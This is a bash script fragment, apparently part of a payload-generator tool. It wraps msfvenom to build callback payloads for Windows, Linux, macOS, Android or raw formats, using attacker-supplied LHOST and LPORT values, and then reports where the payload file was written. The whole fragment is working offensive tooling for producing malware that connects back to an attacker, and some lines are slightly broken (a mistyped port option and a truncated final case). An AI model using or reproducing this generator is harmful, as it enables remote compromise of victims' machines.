case $PLTFRM in
                1)
                    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe > Output/$FILENAME 2> /dev/null
                ;;
                2)
                    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f elf > Output/$FILENAME 2> /dev/null
                ;;
                3)
                    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f macho > Output/$FILENAME.macho 2> /dev/null
                ;;
                4)
                    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT R > Output/$FILENAME 2> /dev/null
                ;;
                5)
                    msfvenom -p $PAYLOAD LHOST=$LHOST PORT=$LPORT -f raw > Output/$FILENAME 2> /dev/null
                                        
                ;;
                *)
                    msfvenom -p $PAYLOAD LHOST=$LHOST PORT=$LPORT -f raw > Output/$FILENAME 2> /dev/nu
esac

FILESIZE=$(wc -c Output/$FILENAME |cut -d" " -f1)
if [ "$FILESIZE" -gt 0 ]; then
    echo ""
    echo "[+] Payload Generated Successfuly :D"
    echo "[i] Payload Path : Output/$FILENAME"        
else
    echo ""
    echo "[-] Payload not Generated :/"
fi
